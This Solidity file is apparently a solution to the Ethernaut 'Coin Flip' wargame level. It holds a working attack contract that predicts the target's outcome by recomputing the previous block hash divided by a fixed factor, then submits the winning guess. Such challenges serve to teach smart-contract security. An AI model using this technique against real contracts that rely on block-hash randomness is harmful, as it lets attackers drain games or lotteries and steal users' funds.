// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/ICoinFlip.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

/**
 * @title Coin Flip Attack (Ethernaut Challenge Level 3 - Coin Flip)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 3
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f
 */
contract CoinFlipAttack {
    using SafeMath for uint256;

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack 10 times and solve the level
     * @param target Address of target contract
     */
    function attack(ICoinFlip target) external {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 consecutiveWins = target.consecutiveWins();

        target.flip(uint256(blockhash(block.number.sub(1))).div(factor) == 1 ? true : false);

        require(consecutiveWins + 1 == target.consecutiveWins(), "CoinFlip: Attack failed");
    }
}
